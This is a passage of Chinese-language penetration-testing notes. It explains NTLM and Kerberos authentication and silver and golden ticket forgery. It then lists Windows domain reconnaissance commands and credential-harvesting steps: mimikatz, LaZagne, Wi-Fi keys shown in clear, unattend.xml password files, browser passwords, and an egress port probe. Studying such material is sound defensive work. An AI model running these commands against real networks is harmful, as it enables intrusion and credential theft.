<p>4&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x6536;&#x5230;challenge&#x540E;&#xFF0C;&#x5C06;&#x8981;&#x767B;&#x5F55;&#x8D26;&#x6237;&#x5BF9;&#x5E94;&#x7684;HTML hash&#x52A0;&#x5BC6;&#x8FD9;&#x4E2A;challenge&#x5F97;&#x5230;Response&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF;</p>
<p>5&#xFF09;&#x670D;&#x52A1;&#x7AEF;&#x518D;&#x6BD4;&#x5BF9;&#x8FD9;&#x4E2A;Response&#x548C;challenge-1&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x76F8;&#x7B49;&#x5219;&#x901A;&#x8FC7;</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/149210/18/33468/11505/6480704dF5a6a7117/8b243469e953be28.jpg" alt="image.png"></p>
<h5 id="kerberos&#x534F;&#x8BAE;">Kerberos&#x534F;&#x8BAE;</h5>
<p>&#x5BA2;&#x6237;&#x7AEF;client&#xFF0C;&#x670D;&#x52A1;&#x7AEF;server&#xFF0C;&#x57DF;&#x63A7;KDC-DC&#x4E0A;&#x7684;</p>
<p>&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
<p>1&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x5411;Kerberos&#x670D;&#x52A1;&#x8BF7;&#x6C42;&#xFF0C;&#x5E0C;&#x671B;&#x83B7;&#x53D6;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6743;&#x9650;&#x3002;Kerberos&#x5F97;&#x5230;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x5224;&#x65AD;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x53EF;&#x4FE1;&#x8D56;&#xFF08;AS&#x6765;&#x5224;&#x65AD;&#xFF09;&#xFF0C;&#x662F;&#x53EF;&#x4FE1;&#x8D56;&#x7684;&#x5C31;&#x8FD4;&#x56DE;TGT&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</p>
<p>2&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x5F97;&#x5230;&#x4E86;TGT&#x4E4B;&#x540E;&#xFF0C;&#x7EE7;&#x7EED;&#x5411;Kerberos&#x8BF7;&#x6C42;&#xFF0C;&#x5E0C;&#x671B;&#x83B7;&#x53D6;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6743;&#x9650;&#xFF0C;Kerberos&#x5224;&#x65AD;TGT&#x662F;&#x5426;&#x6B63;&#x786E;&#xFF0C;&#x5982;&#x679C;&#x6B63;&#x786E;&#x5219;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6743;&#x9650;ticket&#xFF08;TGS&#x7ED9;&#x4E88;&#xFF09;</p>
<p>3&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x5F97;&#x5230;&#x4E86;ticket&#x4E4B;&#x540E;&#xFF0C;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x8FD9;&#x4E2A;ticket&#x53EA;&#x662F;&#x9488;&#x5BF9;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8981;&#x8BBF;&#x95EE;&#x5176;&#x4ED6;&#x7684;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x5219;&#x4F60;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x7533;&#x8BF7;TGT&#x4E4B;&#x540E;&#x518D;&#x5F97;&#x5230;ticket</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/82950/19/25574/21013/6480733dF2828e718/f5cee9047abc8208.jpg" alt="image.png"></p>
<h3 id="&#x767D;&#x94F6;&#x7968;&#x636E;">&#x767D;&#x94F6;&#x7968;&#x636E;</h3>
<p>&#x7279;&#x70B9;&#xFF1A;</p>
<p>1&#xFF09;&#x4E0D;&#x9700;&#x8981;&#x4E0E;KDC&#x8FDB;&#x884C;&#x4EA4;&#x4E92;</p>
<p>2&#xFF09;&#x9700;&#x8981;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x7684;NTLM hash</p>
<p>&#x5728;&#x7B2C;&#x4E09;&#x6B65;&#x8BA4;&#x8BC1;&#x4E2D;&#x7684;Ticket&#x7EC4;&#x6210;&#xFF1A;</p>
<pre><code class="lang-php">Ticket = Server Hash(Server Session Key + Client info + End Time)
</code></pre>
<p>&#x5F53;&#x6211;&#x4EEC;&#x62E5;&#x6709;&#x8FD9;&#x4E2A;<code>Server Hash</code>&#xFF0C;&#x5373;&#x5BA2;&#x6237;&#x7AEF;&#x7684;NTLM hash&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x4E0D;&#x9700;&#x8981;KDC&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#x7684;Ticket&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;<code>Server Session Key</code>&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x77E5;&#x9053;Server Session Key&#x5728;&#x672A;&#x53D1;&#x9001;Ticket&#x524D;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x4E0D;&#x77E5;&#x9053;Server Session Key&#x662F;&#x4EC0;&#x4E48;</p>
<p>&#x7531;&#x4E8E;&#x767D;&#x94F6;&#x7968;&#x636E;&#x9700;&#x8981;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x7684;NTLM hash&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x7528;&#x529E;&#x6CD5;&#x5F97;&#x5230;&#x57DF;&#x5185;&#x6240;&#x6709;&#x673A;&#x5668;&#x7684;&#x7968;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x53EA;&#x80FD;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x67D0;&#x4E9B;&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x4F2A;&#x9020;</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/220738/37/28092/38678/648076dcFb0300fab/371eb22887dc3aeb.jpg" alt="Screenshot_20230607_202336.jpg"></p>
<h6 id="&#x9632;&#x5FA1;&#xFF1A;">&#x9632;&#x5FA1;&#xFF1A;</h6>
<p>&#x5F00;&#x542F;PAC&#xFF08;Privileged Attribute Certificate&#xFF09;&#x7279;&#x6743;&#x5C5E;&#x6027;&#x8BC1;&#x4E66;&#x4FDD;&#x62A4;&#x529F;&#x80FD;&#xFF0C;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x5C06;&#x7968;&#x636E;&#x53D1;&#x9001;&#x7ED9;Kerberos&#x670D;&#x52A1;&#xFF0C;&#x7531;Kerberos&#x670D;&#x52A1;&#x9A8C;&#x8BC1;&#x7968;&#x636E;&#x662F;&#x5426;&#x6709;&#x6548;</p>
<h3 id="&#x9EC4;&#x91D1;&#x7968;&#x636E;">&#x9EC4;&#x91D1;&#x7968;&#x636E;</h3>
<p>&#x7279;&#x70B9;&#xFF1A;</p>
<p>1&#xFF09;&#x9700;&#x8981;&#x4E0E;DC&#x901A;&#x4FE1;</p>
<p>2&#xFF09;&#x9700;&#x8981;krbtgt&#x7528;&#x6237;&#x7684;hash&#xFF08;&#x5373;KDC hash&#xFF0C;&#x53EF;&#x4EE5;KDC&#xFF09;</p>
<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x4E86;KDC hash&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x4F2A;&#x9020;&#x4EFB;&#x610F;&#x7684;TGT&#xFF0C;&#x4ECE;&#x800C;&#x5411;TGS&#x53D1;&#x9001;&#x8BBF;&#x95EE;&#x4EFB;&#x610F;&#x670D;&#x52A1;&#x5668;&#x7684;Ticket</p>
<h3 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x4FE1;&#x606F;&#x6536;&#x96C6;</h3>
<p>&#x5F53;&#x7CFB;&#x7EDF;&#x4E3A;win10&#x6216;2012&#x4EE5;&#x4E0A;&#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x5728;Wdigest&#x5185;&#x5B58;&#x4E2D;&#x7981;&#x6B62;&#x4FDD;&#x5B58;&#x660E;&#x6587;&#x5BC6;&#x7801;(hash&#x53EF;&#x4EE5;&#x6293;&#x5230;)</p>
<p><a href="https://imgtu.com/i/qIaLSe" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qIaLSe.png" alt="qIaLSe.png"></a></p>
<h5 id="&#x57DF;&#x73AF;&#x5883;&#x5224;&#x65AD;&#x548C;&#x57DF;&#x63A7;&#x5B9A;&#x4F4D;">&#x57DF;&#x73AF;&#x5883;&#x5224;&#x65AD;&#x548C;&#x57DF;&#x63A7;&#x5B9A;&#x4F4D;</h5>
<pre><code class="lang-shell">#    &#x662F;&#x5426;&#x5B58;&#x5728;&#x57DF;&#xFF1A;
1    ipconfig /all
2    net view /domain    #    &#x5982;&#x679C;&#x52A0;&#x8F7D;&#x51FA;&#x6765;&#x4E86;&#x90A3;&#x4E48;&#x8BF4;&#x660E;&#x6709;&#x57DF;&#x73AF;&#x5883;
3    net config workstation    #    &#x767B;&#x5F55;&#x4FE1;&#x606F;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x662F;&#x5DE5;&#x4F5C;&#x7EC4;&#x8FD8;&#x662F;&#x57DF;&#x73AF;&#x5883;
</code></pre>
<p><a href="https://imgtu.com/i/qI0uzF" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qI0uzF.png" alt="qI0uzF.png"></a></p>
<p><a href="https://imgtu.com/i/qI0NRO" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qI0NRO.png" alt="qI0NRO.png"></a></p>
<p><a href="https://imgtu.com/i/qI07F0" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qI07F0.png" alt="qI07F0.png"></a></p>
<p><a href="https://imgtu.com/i/qI0gW8" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qI0gW8.jpg" alt="qI0gW8.jpg"></a></p>
<p><a href="https://imgtu.com/i/qIBST1" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qIBST1.png" alt="qIBST1.png"></a></p>
<pre><code class="lang-shell">#    &#x57DF;&#x63A7;&#x5B9A;&#x4F4D;&#xFF1A;
net time /domain        #    &#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x57DF;&#x73AF;&#x5883;&#x5185;&#x7684;&#x65F6;&#x95F4;&#x7EDF;&#x4E00;&#x662F;&#x6839;&#x636E;&#x57DF;&#x63A7;&#x7684;&#x65F6;&#x95F4;&#x4E3A;&#x51C6;
nslookup             #    &#x8FFD;&#x8E2A;&#x5730;&#x5740;&#xFF0C;&#x627E;&#x5230;&#x57DF;&#x63A7;&#x7684;IP&#x5730;&#x5740;

dns&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;53&#x7AEF;&#x53E3;&#xFF0C;&#x800C;dns&#x670D;&#x52A1;&#x5668;&#x901A;&#x5E38;&#x90FD;&#x5728;&#x57DF;&#x63A7;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x626B;&#x5B58;&#x6D3B;&#x4E3B;&#x673A;&#xFF0C;&#x518D;&#x626B;&#x7AEF;&#x53E3;&#xFF0C;&#x627E;&#x5230;&#x5F00;&#x653E;53&#x7AEF;&#x53E3;&#x7684;&#x4E3B;&#x673A;IP&#x5730;&#x5740;
&#x57DF;&#x63A7;&#x7684;&#x540D;&#x5B57;&#x901A;&#x5E38;&#x662F;DC&#xFF0C;DC-control&#xFF0C;&#x8005;&#x662F;&#x57DF;&#x540D;&#x5B50;&#x57DF;&#x540D;&#x7C7B;&#x578B;(&#x6BD4;&#x5982;&#x662F;baidu.com)&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x662F;fanyi.baidu.com
&#x57DF;&#x63A7;&#x6709;Kerberos&#x534F;&#x8BAE;&#x5F00;&#x653E;88&#x7AEF;&#x53E3;
</code></pre>
<p><a href="https://imgtu.com/i/qIBklD" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qIBklD.png" alt="qIBklD.png"></a></p>
<p><a href="https://imgtu.com/i/qIBFSO" target="_blank"><img src="https://s1.ax1x.com/2022/04/02/qIBFSO.jpg" alt="qIBFSO.jpg"></a></p>
<pre><code class="lang-shell">#    &#x76F8;&#x5173;&#x7528;&#x6237;&#x6536;&#x96C6;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;
&#x6536;&#x96C6;&#x8FD9;&#x4E9B;&#x662F;&#x4E3A;&#x4E86;&#x540E;&#x671F;&#x5BC6;&#x7801;&#x653B;&#x51FB;
whoami /all #    &#x67E5;&#x770B;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6743;&#x9650;
net user     #    &#x67E5;&#x770B;&#x672C;&#x5730;&#x7528;&#x6237;
net user /domain #    &#x67E5;&#x770B;&#x57DF;&#x7528;&#x6237;&#x4FE1;&#x606F;
net group /domain #    &#x83B7;&#x53D6;&#x57DF;&#x7528;&#x6237;&#x7EC4;&#x4FE1;&#x606F;
wmic useraccount get /all                 #    &#x6D89;&#x53CA;&#x57DF;&#x7528;&#x6237;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;
net group &quot;Domain Admins&quot; /domain         #    &#x67E5;&#x8BE2;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;
net group &quot;Enterprise Admins&quot; /domain     #    &#x67E5;&#x8BE2;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x7EC4;
net group &quot;Domain Controllers&quot; /domain     #    &#x67E5;&#x8BE2;&#x57DF;&#x63A7;&#x5236;&#x5668;
</code></pre>
<pre><code>&#x51ED;&#x636E;&#x6536;&#x96C6;C:\Users\batma\AppData\Roaming
</code></pre><pre><code class="lang-shell">&#x6536;&#x96C6;&#x5404;&#x79CD;&#x5BC6;&#x6587;&#xFF0C;&#x660E;&#x6587;&#xFF0C;&#x53E3;&#x4EE4;&#x7B49;&#xFF0C;&#x4E3A;&#x540E;&#x7EED;&#x6A2A;&#x5411;&#x6E17;&#x900F;&#x505A;&#x597D;&#x6D4B;&#x8BD5;&#x51C6;&#x5907;
&#x8BA1;&#x7B97;&#x673A;&#x7528;&#x6237; HASH&#xFF0C;&#x660E;&#x6587;&#x83B7;&#x53D6;-mimikatz(win)&#xFF0C;mimipenguin(linux)
&#x8BA1;&#x7B97;&#x673A;&#x5404;&#x79CD;&#x534F;&#x8BAE;&#x670D;&#x52A1;&#x53E3;&#x4EE4;&#x83B7;&#x53D6;-LaZagne(all)
Netsh WLAN show profiles
Netsh WLAN show profile name=&quot;&#x65E0;&#x7EBF;&#x540D;&#x79F0;&quot; key=clear
1.&#x7AD9;&#x70B9;&#x6E90;&#x7801;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x3001;&#x6570;&#x636E;&#x5E93;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x7B49;
2.&#x5404;&#x7C7B;&#x6570;&#x636E;&#x5E93; Web &#x7BA1;&#x7406;&#x5165;&#x53E3;&#xFF0C;&#x5982; PHPMyAdmin
3.&#x6D4F;&#x89C8;&#x5668;&#x4FDD;&#x5B58;&#x5BC6;&#x7801;&#x3001;&#x6D4F;&#x89C8;&#x5668; Cookies
4.&#x5176;&#x4ED6;&#x7528;&#x6237;&#x4F1A;&#x8BDD;&#x3001;3389 &#x548C; ipc$&#x8FDE;&#x63A5;&#x8BB0;&#x5F55;&#x3001;&#x56DE;&#x6536;&#x7AD9;&#x5185;&#x5BB9;
5.Windows &#x4FDD;&#x5B58;&#x7684; WIFI &#x5BC6;&#x7801;
6.&#x7F51;&#x7EDC;&#x5185;&#x90E8;&#x7684;&#x5404;&#x79CD;&#x5E10;&#x53F7;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5982;&#xFF1A;Email&#x3001;VPN&#x3001;FTP&#x3001;OA &#x7B49;
</code></pre>
<h3 id="windows&#x4FE1;&#x606F;&#x6536;&#x96C6;">windows&#x4FE1;&#x606F;&#x6536;&#x96C6;</h3>
<h4 id="&#x57FA;&#x672C;&#x547D;&#x4EE4;">&#x57FA;&#x672C;&#x547D;&#x4EE4;</h4>
<ul>
<li>&#x4E3B;&#x673A;&#x540D; <code>hostname</code></li>
<li>&#x67E5;&#x770B;&#x914D;&#x7F6E;&#x53CA;&#x8865;&#x4E01;&#x4FE1;&#x606F;<code>systeminfo</code></li>
<li>&#x67E5;&#x770B;&#x7248;&#x672C; <code>ver</code></li>
<li>&#x67E5;&#x770B;&#x6740;&#x8F6F;<code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></li>
</ul>
<h4 id="&#x57DF;&#x4FE1;&#x606F;">&#x57DF;&#x4FE1;&#x606F;</h4>
<ul>
<li>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7EC4;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x540D; <code>net view</code>&#xFF0C;&#x7F51;&#x7EDC;&#x53D1;&#x73B0; <code>net view /all</code> &#xFF0C;&#x67E5;&#x770B;&#x6240;&#x6709;&#x57DF; <code>net view /domain</code></li>
<li>&#x5224;&#x65AD;&#x57DF;&#x63A7;&#x662F;&#x5426;&#x5B58;&#x5728;</li>
</ul>
<pre><code class="lang-powershell">ipconfig /all
systeminfo
net config workstation
</code></pre>
<ul>
<li>&#x5B9A;&#x4F4D;&#x57DF;&#x63A7; <code>net time /domain</code></li>
</ul>
<pre><code class="lang-php">nslookup test.com        <span class="hljs-comment">//&#x8FD9;&#x91CC;test.com&#x662F;&#x57DF;&#x63A7;&#x57DF;&#x540D;&#xFF0C;&#x901A;&#x8FC7;ipconfig /all&#x5F97;&#x5230;</span>
nslookup -type=SRV _ldap._tcp    <span class="hljs-comment">//&#x8FD9;&#x91CC;nslookup&#x662F;&#x89E3;&#x6790;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;&#x5185;&#x7F51;&#x4E2D;dns&#x670D;&#x52A1;&#x5668;&#x5C31;&#x5728;&#x57DF;&#x63A7;&#x4E0A;</span>
net time /domain    <span class="hljs-comment">//&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x65F6;&#x95F4;&#x662F;&#x548C;&#x57DF;&#x63A7;&#x65F6;&#x95F4;&#x540C;&#x6B65;</span>
&#x6B64;&#x5916;&#x4F5C;&#x4E3A;&#x57DF;&#x63A7;&#xFF0C;&#x4ED6;&#x7684;&#x57DF;&#x540D;&#x53EF;&#x80FD;&#x662F;DC&#xFF0C;DC-control,&#x7236;&#x57DF;&#x540D;&#x7B49;&#xFF0C;&#x56E0;&#x4E3A;&#x662F;dns&#x670D;&#x52A1;&#x5668;&#x6240;&#x4EE5;&#x5F00;&#x653E;<span class="hljs-number">53</span>&#x7AEF;&#x53E3;&#xFF0C;&#x4E14;kerberos&#x534F;&#x8BAE;&#x5F00;&#x653E;<span class="hljs-number">88</span>&#x7AEF;&#x53E3;
</code></pre>
<p><img src="https://s4.ax1x.com/2022/01/01/T5b77Q.png" alt=""></p>
<h4 id="&#x7528;&#x6237;&#x4FE1;&#x606F;">&#x7528;&#x6237;&#x4FE1;&#x606F;</h4>
<ul>
<li><p>&#x67E5;&#x770B;&#x7528;&#x6237;<code>whoami /priv</code> / <code>whoami /user</code></p>
</li>
<li><p>&#x7528;&#x6237;&#x7279;&#x6743;&#x4FE1;&#x606F; <code>whoami /priv</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x5F53;&#x524D;&#x6743;&#x9650; <code>net localgroup administrators</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x5728;&#x7EBF;&#x7528;&#x6237; <code>quser</code> / <code>qwinsta</code> / <code>query user</code></p>
</li>
<li><p>&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#xFF0C;&#x5168;&#x540D;&#xFF0C;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#xFF0C;&#x5DE5;&#x4F5C; &#x7AD9;&#x57DF;&#xFF0C;&#x767B;&#x9646;&#x57DF; <code>net config Workstation</code></p>
</li>
<li><p>ACL &#x4FE1;&#x606F; <code>get-acl</code></p>
</li>
</ul>
<h5 id="&#x7F51;&#x7EDC;&#x4FE1;&#x606F;">&#x7F51;&#x7EDC;&#x4FE1;&#x606F;</h5>
<ul>
<li><p>&#x5185;&#x7F51;&#x7F51;&#x6BB5;&#x4FE1;&#x606F;</p>
</li>
<li><p>&#x7F51;&#x5361;&#x4FE1;&#x606F; <code>ipconfig</code></p>
</li>
<li><p>&#x5916;&#x7F51;&#x51FA;&#x53E3;</p>
</li>
<li><p>ARP&#x8868; <code>arp -a</code></p>
</li>
<li><p>&#x8DEF;&#x7531;&#x8868; <code>route print</code></p>
</li>
<li><p>&#x76D1;&#x542C;&#x7684;&#x7AEF;&#x53E3; <code>netstat -ano</code></p>
</li>
<li><p>&#x8FDE;&#x63A5;&#x7684;&#x7AEF;&#x53E3;</p>
</li>
<li><ul>
<li><p>&#x7AEF;&#x53E3;&#x4FE1;&#x606F;</p>
<p><code>Get-NetTCPConnection</code></p>
</li>
</ul>
</li>
<li><p>hosts&#x6587;&#x4EF6;</p>
</li>
<li><p>&#x4E3B;&#x5907; DNS</p>
</li>
<li><ul>
<li><p>DNS&#x7F13;&#x5B58;</p>
<p><code>ipconfig /displaydns``Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x63A2;&#x6D4B;&#x51FA;&#x7F51;&#x60C5;&#x51B5;</p>
<p>powershell -c &quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(&apos;allports.exposed&apos;,$<em>)) $</em> } 2&gt;$null&quot;</p>
</li>
</ul>
</li>
</ul>
<h4 id="&#x9632;&#x706B;&#x5899;">&#x9632;&#x706B;&#x5899;</h4>
<ul>
<li>&#x67E5;&#x770B;&#x9632;&#x706B;&#x5899;&#x72B6;&#x6001; <code>netsh advfirewall show allprofiles</code></li>
<li>&#x9632;&#x706B;&#x5899;&#x65E5;&#x5FD7;&#x76EE;&#x5F55; <code>netsh firewall show logging</code></li>
<li>&#x9632;&#x706B;&#x5899;&#x89C4;&#x5219; <code>netsh advfirewall firewall show rule name=all</code></li>
<li><code>netsh firewall show config</code></li>
<li><code>netsh firewall show state</code></li>
</ul>
<h4 id="&#x5BC6;&#x7801;&#x4FE1;&#x606F;">&#x5BC6;&#x7801;&#x4FE1;&#x606F;</h4>
<ul>
<li><p>Windows RDP&#x8FDE;&#x63A5;&#x8BB0;&#x5F55;</p>
</li>
<li><p>&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x4FDD;&#x5B58;&#x7684;&#x8D26;&#x53F7;&#x5BC6;&#x7801;</p>
</li>
<li><p>&#x7CFB;&#x7EDF;&#x5BC6;&#x7801;&#x7BA1;&#x7406;&#x5668;&#x4E2D;&#x7684;&#x5404;&#x79CD;&#x5BC6;&#x7801;</p>
</li>
<li><ul>
<li><p>&#x65E0;&#x4EBA;&#x503C;&#x5B88;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x4FE1;&#x606F;</p>
<p><code>C:\sysprep.inf``C:\sysprep\sysprep.xml``C:\Windows\Panther\Unattend\Unattended.xml``C:\Windows\Panther\Unattended.xml</code></p>
</li>
</ul>
</li>
</ul>
<h4 id="&#x7968;&#x636E;&#x4FE1;&#x606F;">&#x7968;&#x636E;&#x4FE1;&#x606F;</h4>
<ul>
<li><code>cmdkey /l</code></li>
<li>klist</li>
<li>msf meterpreter</li>
</ul>
<h4 id="&#x7279;&#x6B8A;&#x6587;&#x4EF6;">&#x7279;&#x6B8A;&#x6587;&#x4EF6;</h4>
<ul>
<li><ul>
<li><p>&#x6587;&#x6863;</p>
<p>xlsx / xlsdocx / docpptx / pptvsdx / vsdmd / txt</p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x538B;&#x7F29;&#x6587;&#x4EF6;</p>
<p>zip / rar / 7z</p>
</li>
</ul>
</li>
<li><ul>
<li><p>VPN&#x914D;&#x7F6E;</p>
<p>ovpn</p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x4EE3;&#x7801;</p>
<p>py / php / jsp / aspx / asp / sql</p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p>
<p>conf / ini / xml</p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x7279;&#x5B9A;&#x5173;&#x952E;&#x5B57;</p>
<p>&#x8D26;&#x53F7; / &#x8D26;&#x6237; / &#x767B;&#x5F55; / login / user&#x5BC6;&#x7801; / pass&#x4EE3;&#x7801; / &#x6587;&#x6863; / &#x4EA4;&#x63A5; / &#x5907;&#x4EFD; / git / svn&#x90AE;&#x7BB1; / &#x901A;&#x8BAF;&#x5F55; / &#x96C6;&#x7FA4; / &#x529E;&#x516C;&#x4EE3;&#x7406; / &#x5185;&#x7F51; / VPN&#x8BBE;&#x5907; / &#x8D44;&#x4EA7;&#x7CFB;&#x7EDF; / &#x8FD0;&#x7EF4; / &#x62D3;&#x6251; / &#x7F51;&#x7EDC; / IT&#x540E;&#x53F0; / &#x7BA1;&#x7406;&#x5458; / &#x6570;&#x636E;&#x5E93;&#x76D1;&#x63A7; / &#x9694;&#x79BB; / &#x9632;&#x706B;&#x5899; / &#x7F51;&#x95F8; / &#x5DE1;&#x68C0;</p>
</li>
</ul>
</li>
</ul>
<h4 id="&#x5C40;&#x57DF;&#x7F51;&#x5B58;&#x6D3B;&#x4E3B;&#x673A;">&#x5C40;&#x57DF;&#x7F51;&#x5B58;&#x6D3B;&#x4E3B;&#x673A;</h4>
<ul>
<li>NetBIOS&#x626B;&#x63CF;</li>
<li>OXID&#x626B;&#x63CF;</li>
</ul>
<h4 id="&#x5176;&#x4ED6;">&#x5176;&#x4ED6;</h4>
<ul>
<li><p>&#x542F;&#x7528;&#x7684;&#x5171;&#x4EAB;&#x6587;&#x4EF6;&#x5939;</p>
</li>
<li><p>&#x56DE;&#x6536;&#x7AD9;</p>
</li>
<li><p>&#x6700;&#x8FD1;&#x8FD0;&#x884C;&#x7684;&#x547D;&#x4EE4;</p>
</li>
<li><p>&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x5386;&#x53F2;&#x8BB0;&#x5F55;</p>
</li>
<li><ul>
<li><p>&#x67E5;&#x770B;&#x8865;&#x4E01;&#x5B89;&#x88C5;&#x60C5;&#x51B5;</p>
<p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x65E5;&#x5FD7;&#x4E0E;&#x4E8B;&#x4EF6;&#x4FE1;&#x606F;</p>
<p><code>wevtutil``eventvwr</code></p>
</li>
</ul>
</li>
<li><ul>
<li><p>&#x6CE8;&#x518C;&#x8868;&#x4FE1;&#x606F;</p>
<p><code>reg</code></p>
</li>
</ul>
</li>
<li><p>&#x5B89;&#x88C5;&#x7684;&#x5404;&#x7C7B; agent &#x76D1;&#x63A7;&#x8F6F;&#x4EF6;</p>
</li>
<li><p>&#x5B89;&#x88C5;&#x7684;&#x6740;&#x6BD2;&#x8F6F;&#x4EF6;</p>
</li>
<li><ul>
<li><p>&#x67E5;&#x770B;/&#x8BBE;&#x7F6E;&#x540E;&#x7F00;&#x5173;&#x8054;</p>
<p><code>assoc``assoc .ext=example</code></p>
</li>
</ul>
</li>
<li><p>PowerShell &#x7248;&#x672C;</p>
</li>
<li><p>.Net &#x7248;&#x672C;</p>
</li>
<li><p>Wi-Fi &#x5BC6;&#x7801;</p>
</li>
</ul>
<h3 id="linux&#x4FE1;&#x606F;&#x6536;&#x96C6;">linux&#x4FE1;&#x606F;&#x6536;&#x96C6;</h3>
<h4 id="&#x83B7;&#x53D6;&#x5185;&#x6838;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x548C;&#x8BBE;&#x5907;&#x4FE1;&#x606F;">&#x83B7;&#x53D6;&#x5185;&#x6838;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x548C;&#x8BBE;&#x5907;&#x4FE1;&#x606F;</h4>
<ul>
<li><ul>
<li><p>&#x7248;&#x672C;&#x4FE1;&#x606F;</p>
<p><code>uname -a</code> &#x6240;&#x6709;&#x7248;&#x672C;<code>uname -r</code> &#x5185;&#x6838;&#x7248;&#x672C;&#x4FE1;&#x606F;<code>uname -n</code> &#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x540D;&#x5B57;<code>uname -m</code> Linux&#x5185;&#x6838;&#x67B6;&#x6784;</p>
</li>
</ul>
</li>
<li><p>&#x5185;&#x6838;&#x4FE1;&#x606F; <code>cat /proc/version</code></p>
</li>
<li><p>CPU&#x4FE1;&#x606F; <code>cat /proc/cpuinfo</code></p>
</li>
<li><ul>
<li><p>&#x53D1;&#x5E03;&#x4FE1;&#x606F;</p>
<p><code>cat /etc/*-release``cat /etc/issue</code></p>
</li>
</ul>
